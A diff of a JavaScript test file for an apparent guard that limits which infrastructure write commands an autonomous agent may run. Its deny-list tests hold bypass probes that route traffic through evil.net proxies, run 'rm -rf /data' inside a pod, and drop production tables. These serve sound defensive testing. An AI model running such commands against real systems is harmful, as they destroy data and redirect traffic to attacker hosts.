@@ -78,7 +78,8 @@ test('resolveScopes: k8s.write:stg has target stg, its matchers, a fingerprint a
   const [s] = resolveScopes(['k8s.write:stg'], catalog);
   assert.equal(s.name, 'k8s.write');
   assert.equal(s.target, 'stg');
-  assert.deepEqual(s.matchers, { mcp: catalog['k8s.write'].mcp, bash: catalog['k8s.write'].bash, hosts: catalog['k8s.write'].hosts });
+  assert.deepEqual(s.matchers, { mcp: catalog['k8s.write'].mcp, bash: catalog['k8s.write'].bash, hosts: catalog['k8s.write'].hosts, commands: catalog['k8s.write'].commands });
+  assert.ok(s.matchers.commands.kubectl.verbs.includes('apply'), 'R25: the tool lists travel with the grant');
   assert.match(s.fingerprint, /^[0-9a-f]{64}$/);
   assert.equal(s.env.KUBECONFIG, rwStg.replace(/\\/g, '/'), 'the target table wins over the scope table');
   const [dev] = resolveScopes(['k8s.write:dev'], catalog);
@@ -155,8 +156,22 @@ test('I1: a literal credential value enters a fingerprint only as an HMAC under 
   assert.equal(scopeKey({ QUILL_HOME: home }), key);
   const file = path.join(home, SCOPE_KEY_FILE);
   if (process.platform !== 'win32') assert.equal(fs.statSync(file).mode & 0o777, 0o600);
-  fs.writeFileSync(file, 'not a key');
-  assert.throws(() => scopeKey({ QUILL_HOME: home }), (e) => e.code === 'scope-key-unavailable');
+  // I1-a: a file that is not a key (empty, or cut short by a crash) is replaced, never trusted;
+  // the key appears only complete (written aside, then linked), and no temporary file stays.
+  for (const junk of ['', 'not a key', '0123abcd']) {
+    fs.writeFileSync(file, junk);
+    const fresh = scopeKey({ QUILL_HOME: home });
+    assert.match(fresh, /^[0-9a-f]{64}$/, JSON.stringify(junk));
+    assert.notEqual(fresh, key);
+    assert.equal(fs.readFileSync(file, 'utf8').trim(), fresh);
+  }
+  assert.deepEqual(fs.readdirSync(home).filter((n) => n.endsWith('.tmp')), []);
+  // I1-b: an existing key others can read is made owner-only.
+  if (process.platform !== 'win32') {
+    fs.chmodSync(file, 0o644);
+    scopeKey({ QUILL_HOME: home });
+    assert.equal(fs.statSync(file).mode & 0o777, 0o600);
+  }
   // Validation never reads the key: a catalog with literals validates in a home without one.
   const bare = { QUILL_HOME: path.join(scratch, 'nokey') };
   assert.equal(validatorOf(ownerK8s(), { env: bare })(['k8s.write:stg']).length, 1);
@@ -188,11 +203,13 @@ test('config: invalid entries are ignored with warnings that name keys, never va
     '[scopes."db.write"]', `env.MYSQL_PWD = "${pw}"`, `env.DATABASE_URL = "postgres://u:${pw}@h/db"`, `env.REDIS_URL = "redis://:${pw}@h"`,
     `env.APP_DB_PASS = "${pw}"`, `env.MONGO_URI = "mongodb://h/db"`, `env.HDR = "Authorization: Bearer ${pw}"`, `env.ANY = "https://u:${pw}@x.example.com"`,
     'env.PGSERVICEFILE = "/home/me/.pg_service.conf"', 'env.DSN_REF = "env:ORDERS_DSN"',
+    // I1-c: a password= setting inside any value
+    `env.ORDERS_URL = "postgres://u@h/db?password=${pw}"`, `env.PG_CONN = "host=h password=${pw}"`, `env.X_CONN = "Server=h;Pwd=${pw}"`,
   ].join('\n'));
   const wideCatalog = loadScopeCatalog(wide);
   assert.deepEqual(Object.keys(wideCatalog['db.write'].env).sort(), ['DSN_REF', 'PGSERVICEFILE']);
   const wideText = scopeSettings(wide).warnings.join('\n');
-  for (const n of ['MYSQL_PWD', 'DATABASE_URL', 'REDIS_URL', 'APP_DB_PASS', 'MONGO_URI', 'HDR', 'ANY']) assert.match(wideText, new RegExp(`env\\.${n} `), n);
+  for (const n of ['MYSQL_PWD', 'DATABASE_URL', 'REDIS_URL', 'APP_DB_PASS', 'MONGO_URI', 'HDR', 'ANY', 'ORDERS_URL', 'PG_CONN', 'X_CONN']) assert.match(wideText, new RegExp(`env\\.${n} `), n);
   assert.doesNotMatch(wideText, new RegExp(pw));
   // M2: an owner scope covers MCP tools only; command and host patterns are refused.
   const ownerCmd = scopeSettings(toml('[scopes."pager.write"]\nmcp = ["mcp__pager__create_incident"]\nbash = ["curl *"]\nhosts = ["*"]\n'));
@@ -268,6 +285,9 @@ test('prodEffects: observed writes of a full-access run, scope, target, tool and
     { scope: 'jira.write', target: 'PROJ-1', tool: 'mcp__claude_ai_Atlassian__transitionJiraIssue', t: '2026-10-02T08:00:04Z' },
   ]);
   assert.deepEqual(prodEffects([]), []);
+  // N2: a write the allow-list could not pin to one target is recorded with none, never the first-named one.
+  const ambiguous = { kind: 'guard', ts: '2026-10-02T08:00:07Z', tool_name: 'Bash', decision: 'allow', class: 'write', scope: 'k8s.write', target: 'stg', ambiguous: true, critical: true, enforce_decision: 'deny' };
+  assert.deepEqual(prodEffects([ambiguous]), [{ scope: 'k8s.write', target: null, tool: 'Bash', t: '2026-10-02T08:00:07Z', ambiguous: true }]);
 });
 
 // ---------------------------------------------------------------- ruling R24 (review C1)
@@ -288,7 +308,53 @@ function r24Grant() {
 }
 
 // [tool, command]: each names its granted target, and each must stay uncovered (a critical change).
+// Rows from review round 1 (R24) and round 2 (R25: allow-list, not deny-list).
 const R24_UNCOVERED = [
+  // R25 (re-review round 1): forms a deny-list missed
+  ['Bash', 'argocd app sync stg-app -N prod-ns'],
+  ['Bash', 'argocd app sync stg-app --app-namespace prod-ns'],
+  ['Bash', 'argocd app sync stg-app --project prod-project'],
+  ['Bash', 'argocd app sync stg-app -p prod-project'],
+  ['Bash', 'argocd context prod && argocd app sync stg-app'],
+  ['Bash', 'gh api -X POST --hostname api.example.com --hostname evil.net /x'],
+  ['Bash', 'curl -X POST --url https://api.example.com/x --expand-url https://evil.net/y'],
+  ['PowerShell', "$PSDefaultParameterValues['Invoke-RestMethod:Proxy']='http://evil.net'; Invoke-RestMethod https://api.example.com -Method Post"],
+  ['Bash', 'aws --profile stg configure set role_arn arn:aws:iam::1:role/admin'],
+  ['Bash', 'gcloud --project stg config set auth/impersonate_service_account admin@prod.iam'],
+  ['Bash', 'psql -h stg --hos=prod -c "drop table t"'],
+  ['Bash', 'psql -h stg --db=host=prod -c "drop table t"'],
+  ['Bash', 'psql -h stg --dbn=postgres://prod/db -c "drop table t"'],
+  ['Bash', 'wget --post-data=a --inp=urls.txt https://api.example.com/x'],
+  ['Bash', 'wget --post-data=a --exec=http_proxy=http://evil.net https://api.example.com/x'],
+  ['Bash', 'cd ../prod && pulumi up -s stg'],
+  ['Bash', 'pushd ../prod && pulumi up -s stg'],
+  ['Bash', 'cd /tmp && kubectl --context stg delete pod api'],
+  ['Bash', 'gcloud --project stg --flags-file f.yaml run deploy svc'],
+  ['Bash', 'bq --project_id stg --flagfile=f.txt rm -f ds.t'],
+  ['Bash', 'hash -p /x/kubectl kubectl; kubectl --context stg apply -f x.yaml'],
+  ['Bash', './kubectl --context stg apply -f x.yaml'],
+  ['Bash', '/usr/local/bin/kubectl --context stg apply -f x.yaml'],
+  ['Bash', 'kubectl --context stg exec api -- rm -rf /data'],
+  ['Bash', 'kubectl --context stg --namesp=prod delete pod api'],
+  ['Bash', 'kubectl --context stg drain node1'],
+  ['Bash', 'argocd login prod.example.com && argocd app sync stg-app'],
+  ['Bash', 'curl -X POST -L https://api.example.com/x'],
+  ['Bash', 'curl -X POST --next https://api.example.com/x -d a https://evil.net/y'],
+  ['Bash', 'curl -X POST http://api.example.com.evil.net/x'],
+  ['Bash', 'curl -X POST https://api.example.com@evil.net/x'],
+  ['Bash', 'curl -X POST api.example.com/x'],
+  ['Bash', 'psql -h stg -c "drop table t" postgres://prod/db'],
+  ['Bash', 'psql -h stg < drop.sql'],
+  ['Bash', 'mysql -h stg --ho=prod -e "drop table t"'],
+  ['Bash', 'aws --profile stg --prof prod s3 rm s3://b/k'],
+  ['Bash', 'aws --profile stg --endpoint https://evil.net s3 rm s3://b/k'],
+  ['Bash', 'http --prox=https:http://evil.net POST https://api.example.com/x a=1'],
+  ['Bash', 'terraform apply -auto-approve'],
+  ['PowerShell', 'Invoke-RestMethod -Uri https://api.example.com/x -Method Post -Prox http://evil.net'],
+  ['PowerShell', 'curl -Uri https://api.example.com/x -Method Post'],
+  ['Bash', 'kubectl --context stg apply -f x.yaml &'],
+  ['Bash', 'kubectl --context stg apply -f x.yaml > out.txt'],
+
   // the review's probes
   ['Bash', 'kubectl --context stg --context prod delete pod api'],
   ['Bash', 'kubectl --context stg --kubeconfig /home/me/.kube/config delete pod api'],
@@ -379,23 +445,59 @@ const R24_UNCOVERED = [
   ['Bash', 'nc api.example.com 80 < f'],
 ];
 
-test('R24: a granted scope covers a write only when it names one target once, with nothing that changes where it connects', () => {
+test('R24/R25: a granted scope covers only one plain allow-listed command naming its one target once', () => {
   const run = r24Grant();
-  for (const [tool, command] of R24_UNCOVERED) {
-    const r = run(command, tool);
-    assert.equal(r.decision, 'deny', `${tool}: ${command}`);
-    assert.match(r.reason, /^QUILL_CRITICAL_CHANGE scope=[^ ]+ target=[^:]*: not granted for this run, and no scope covers a command whose target is ambiguous/, `${tool}: ${command}`);
+  // Each must be denied: a critical change, or refused even earlier (unknown-prod, unparseable).
+  const covered = R24_UNCOVERED.map(([tool, command]) => [tool, command, run(command, tool)]).filter(([, , r]) => r.decision !== 'deny' || !/^QUILL_CRITICAL_CHANGE scope=|^QUILL_DENIED /.test(r.reason));
+  assert.deepEqual(covered.map(([tool, command, r]) => `${tool}: ${command} => ${r.decision} ${r.reason}`), []);
+  // Forms that must stay covered: the allow-list is usable.
+  for (const command of ['kubectl --context stg apply -f k8s/deploy.yaml', 'kubectl --context=stg -n app rollout restart deploy/api', 'kubectl --context stg delete pod api',
+    'helm --kube-context stg uninstall api', 'helm --kube-context stg upgrade api ./chart -n app --set image.tag=1.2 --wait', 'argocd app sync stg-app', 'argocd app sync stg-app --prune', 'argocd app rollback stg-app 3',
+    'aws --profile stg s3 cp a s3://b/c', 'aws --profile stg s3 rm s3://b/k', 'psql -h stg -d app -c "update t set a = 1"', 'psql --host=stg --command="drop table t"', 'mysql -h stg -e "delete from t"',
+    'pulumi up --stack stg --yes', 'serverless deploy --stage stg', 'curl -X POST https://api.example.com/v1/x -H \'Content-Type: application/json\' -d @body.json',
+    'curl -X POST https://API.Example.com./x', 'http POST https://api.example.com/x a=1']) {
+    const r = run(command);
+    assert.equal(r.decision, 'allow', `${command} => ${r.reason}`);
   }
-  // The same scopes still cover the plain forms.
-  for (const command of ['kubectl --context stg delete pod api', 'kubectl --context=stg delete pod api', 'helm --kube-context stg uninstall api', 'aws --profile stg s3 rm s3://b/k',
-    'psql -h stg -c "drop table t"', 'pulumi up --stack stg', 'serverless deploy --stage stg', 'argocd app sync stg-app', 'argocd app rollback stg-app 3', 'curl -X POST https://api.example.com/x',
-    'cd /tmp && kubectl --context stg delete pod api']) {
-    assert.equal(run(command).decision, 'allow', command);
+  for (const command of ['Invoke-RestMethod -Uri https://api.example.com/x -Method Post -ContentType application/json -Body x', 'Invoke-RestMethod https://api.example.com/x -Method Post', 'irm -Uri:https://api.example.com/x -Method:Post']) {
+    const r = run(command, 'PowerShell');
+    assert.equal(r.decision, 'allow', `${command} => ${r.reason}`);
   }
-  assert.equal(run('Invoke-RestMethod -Uri https://api.example.com/x -Method Post', 'PowerShell').decision, 'allow');
   // The refusal says why, so the agent can retry with a plain command.
-  assert.match(run('kubectl --context stg --context prod delete pod api').reason, /target is ambiguous \(--context is given more than once\)/);
-  assert.match(run('export KUBECONFIG=/x; kubectl --context stg delete pod api').reason, /target is ambiguous \(export changes the environment\)/);
+  assert.match(run('kubectl --context stg --context prod delete pod api').reason, /does not cover this command \(--context must be given exactly once\)/);
+  assert.match(run('export KUBECONFIG=/x; kubectl --context stg delete pod api').reason, /does not cover this command \(it is more than one command/);
+  assert.match(run('psql -h stg --hos=prod -c "drop table t"').reason, /option --hos is not on the psql list \(options are matched exactly, never abbreviated\)/);
+  assert.match(run('aws --profile stg configure set role_arn x').reason, /aws configure changes what a target means and is never covered/);
+});
+
+test('R25: a covered write runs inside the run\'s checkout', () => {
+  const tmp = fs.mkdtempSync(path.join(scratch, 'cwd-'));
+  const elsewhere = fs.mkdtempSync(path.join(scratch, 'other-'));
+  const scopes = resolveScopes(['deploy:stg'], loadScopeCatalog({})).map(({ name, target, matchers, fingerprint }) => ({ name, target, matchers, fingerprint }));
+  const grant = { access: 'autonomous', permissions: {}, scopes, actionPins: [], checkoutRoot: tmp, readableRoots: [tmp, elsewhere], writableRoots: [tmp], protectedPaths: [], mcpPolicy: { read: [], write: {} }, trustedMcpServers: [], trackerHosts: [] };
+  const at = (cwd) => decide({ tool_name: 'Bash', tool_input: { command: 'pulumi up -s stg' } }, grant, { cwd, vars: { HOME: tmp, USERPROFILE: tmp, TEMP: tmp, TMP: tmp, QUILL_HANDOFF_GUARD: 'enforce' } });
+  assert.equal(at(tmp).decision, 'allow');
+  assert.equal(at(path.join(tmp, 'infra')).decision, 'allow');
+  const outside = at(elsewhere);
+  assert.equal(outside.decision, 'deny', 'a cd in an earlier call moved the shell out of the checkout');
+  assert.match(outside.reason, /does not run inside the run's checkout/);
+});
+
+test('R25: the owner may add verbs and options, never a target-changing one', () => {
+  const cfg = toml([
+    '[scopes."k8s.write".commands.kubectl]', 'verbs = ["drain", "config set-context"]', 'flags = ["--ignore-daemonsets", "--kubeconfig"]', 'values = ["--pod-selector", "--context"]',
+    '[scopes."k8s.write".commands.terraform]', 'verbs = ["apply"]',
+    '[scopes."pager.write"]', 'mcp = ["mcp__pager__x"]', '[scopes."pager.write".commands.curl]', 'verbs = ["x"]',
+  ].join('\n'));
+  const { warnings } = scopeSettings(cfg);
+  const text = warnings.join('\n');
+  for (const bad of ['verbs[1]', 'flags[1]', 'values[1]', 'terraform is not a tool', 'only a built-in scope']) assert.match(text, new RegExp(bad.replace(/[[\]]/g, '\\$&')), bad);
+  const kubectl = loadScopeCatalog(cfg)['k8s.write'].commands.kubectl;
+  assert.ok(kubectl.verbs.includes('drain') && !kubectl.verbs.includes('config set-context'));
+  assert.equal(kubectl.options['--ignore-daemonsets'], 'flag');
+  assert.equal(kubectl.options['--pod-selector'], 'value');
+  assert.equal(kubectl.options['--kubeconfig'], undefined);
+  assert.notEqual(loadScopeCatalog(cfg)['k8s.write'].fingerprint, loadScopeCatalog({})['k8s.write'].fingerprint, 'an extended list is another scope');
 });
 
 // ---------------------------------------------------------------- review C2
@@ -403,6 +505,10 @@ test('R24: a granted scope covers a write only when it names one target once, wi
 test('C2: variables a scope takes through env:NAME leave every autonomous run; a granted scope sets only its own variable', () => {
   const cfg = toml('[scopes."db.write".targets.orders-stg]\nenv.DATABASE_URL = "env:ORDERS_STG_RW_URL"\n[scopes."k8s.write".targets.stg]\nenv.KUBECONFIG = "env:STG_RW_KUBECONFIG"\n');
   assert.deepEqual(scopeReferences(cfg).sort(), ['ORDERS_STG_RW_URL', 'STG_RW_KUBECONFIG']);
+  // C2-a: references in tables the catalog drops are sources the owner declared all the same.
+  const dropped = toml('[scopes."pager.write"]\nenv.PAGER_URL = "env:PAGER_RW_URL"\n[scopes."jira.write".targets.x]\nenv.JIRA_URL = "env:JIRA_RW_URL"\n[scopes."git.push"]\nenv.GH_TOKEN = "env:GH_RW_TOKEN"\n');
+  assert.equal(loadScopeCatalog(dropped)['pager.write'], undefined);
+  assert.deepEqual(scopeReferences(dropped).sort(), ['GH_RW_TOKEN', 'JIRA_RW_URL', 'PAGER_RW_URL']);
   const runDir = fs.mkdtempSync(path.join(scratch, 'c2-'));
   const baseEnv = { PATH: process.env.PATH ?? '', ORDERS_STG_RW_URL: 'postgres://rw@stg/orders', STG_RW_KUBECONFIG: '/rw/kube', UNRELATED: 'stays' };
   const base = { baseEnv, access: 'autonomous', runDir, gitUser: null, keepEnv: ['ORDERS_STG_RW_URL'], stripNames: scopeReferences(cfg) };
